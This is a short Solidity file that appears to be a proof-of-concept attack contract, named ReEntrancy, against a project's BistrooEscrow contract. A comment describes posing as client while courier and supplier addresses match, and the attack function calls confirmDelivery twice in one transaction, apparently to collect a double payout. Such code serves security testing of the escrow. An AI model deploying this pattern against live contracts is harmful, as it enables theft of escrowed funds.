pragma solidity>0.4.99<0.6.0;

import "./BistrooEscrow.sol";

// attack contract creates delivery as client and courier address == supplier address
// in which case msg.sender == tx.origin == client

contract ReEntrancy {
    BistrooEscrow bistrooEscrow;

    constructor(address addr) public {
        bistrooEscrow = BistrooEscrow(addr);
    }
    event attackDone(uint256 deliveryID, string status);
    function attack(bytes memory userData) public {
        bistrooEscrow.confirmDelivery(userData);
        bistrooEscrow.confirmDelivery(userData);
        uint256 deliveryID = bistrooEscrow.bytesToUint(userData);
        emit attackDone(deliveryID, "done");
    }

    function () external payable {}

}